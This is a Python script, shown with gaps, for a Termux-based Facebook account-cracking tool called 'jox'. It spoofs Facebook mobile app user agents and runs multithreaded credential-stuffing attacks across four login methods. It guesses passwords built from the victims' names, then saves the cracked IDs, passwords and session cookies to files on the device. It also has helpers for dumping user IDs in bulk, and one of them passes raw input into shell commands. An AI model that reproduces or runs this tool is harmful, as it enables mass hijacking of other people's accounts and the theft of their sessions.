...
from concurrent.futures import ThreadPoolExecutor as mominjox
from string import * 
...
def ua():
	...
	rdp = str(random.randint(11111111,99999999))
	return '[FBAN/FB4A;FBAV/'+omp+'.0.0.20.'+omp+';FBBV/30034644;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/Etisalat NG;FBMF/TECNO;FBBD/TECNO;FBPN/com.facebook.katana;FBDV/TECNO-W3;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'

sys.stdout.write('\x1b]2; jox\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
logo =                                          """            
\033[1;37m   d88b  .d88b.  db   dD d88888b d8888b. 
\033[1;37m   `8P' .8P  Y8. 88 ,8P' 88'     88  `8D 
\033[1;37m    88  88    88 88,8P   88ooooo 88oobY' 
\033[1;37m    88  88    88 88`8b   88~~~~~ 88`8b   
\033[1;37mdb. 88  `8b  d8' 88 `88. 88.     88 `88. 
\033[1;37m------------------------------------------------
\033[1;37m Owner   :            jox
\033[1;37m Facebook:            jox
\033[1;37m Github  :            MDJOKER2006
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(' MRJOKER OK: %s' % str(len(oks)))
        print(' MRJOKER CP: %s' % str(len(cps)))
        print(47*'-')
        input("Press enter to back jox Menu ")
        exit()
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[jox] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                version = str(random.randint(7,13))
                model = 'samsung'
                brand_name = 'samsung'
                width = '720'
                height = '1280'
                uas = 'Dalvik/2.1.0 (Linux; U; Android '+version+'.0.0; '+model+'Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/'+brand_name+';FBBD/'+brand_name+';FBDV/'+brand_name+';FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width='+width+',height='+height+'};FB_FW/1;]'
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);joxb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={joxb};{ckkk}"
                    print(f"\r{R} [jox-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/jox_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/jox_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r{A} [jox-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/jox_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[jox] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [jox-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/jox_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/jox_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r{A} [jox-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[jox] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[jox] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [jox-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/jox_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            os.system("clear")
            print(logo)
            print(f'{S} [Example: Afghanistan,Afghan1122,afghan110099,loveafghanistan,ETC]')
            print('')
            if sl =='':
            ...
            print(47*"-")
            with mominjox(max_workers=30) as joxworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                joxworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                joxworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                joxworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                joxworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/jox.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/jox.txt\033[0;97m')
    print(47*'-')
    new_save = input('Save new file as: ')
    clear()
    print('\033[1;37mExample: 070008,77007,78006')
    print(47*'-')
    y = 0
...
def cutter():
    ...
    jox = input('Put File Name :')
    print(" ")
    momin = input('Saving Put File Name :')
    os.system('touch ' +momin)
    os.system('sort -r '+jox+' | uniq > '+momin)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + jox )
    print(47*'-')
    print("File Saved To :" + momin )
    print(47*'-')
    input(f"{S} Press Enter To Back jox Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/jox.txt\n') 
        filepath = input("Put File Name: ")
